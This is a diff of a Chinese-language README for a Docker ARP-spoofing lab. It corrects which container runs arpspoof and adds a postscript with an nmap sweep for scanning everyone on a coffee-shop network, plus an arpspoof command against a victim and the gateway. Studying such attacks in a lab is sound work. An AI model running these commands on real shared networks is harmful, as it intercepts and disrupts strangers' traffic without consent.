@@ -32,10 +32,16 @@ Hacker: 中間人，竊聽者;arpspoofing
 # 使用方式
 1. docker-compose up -d
 2. 分別進入box1及box2的container內部輸入`ip addr`確認container內部ip
-3. 進入Victim內部，輸入指令arpspoof -r -i eth0 -t ${box1_ip} ${box2_ip}
+3. 進入Hacker內部，輸入指令arpspoof -r -i eth0 -t ${box1_ip} ${box2_ip}
 4. 再開一個新的terminal一樣進入Victim內部，使用tcpdump確認封包會不會送到Hacker這邊
 5. 在box1下curl http://${box2_ip}，確認tcpdump是否有box1往box2的包以及box2回覆box1的包
 
+# 後記
+如何在咖啡廳裡掃瞄出所有人的ip/mac
+> sudo nmap -sn -PE -n 10.0.0.0/24
+
+如何做出牆dns的行為
+> arpspoof -i eth0 ${受害者IP} ${區域網段_gateway}
 
 
 # refer
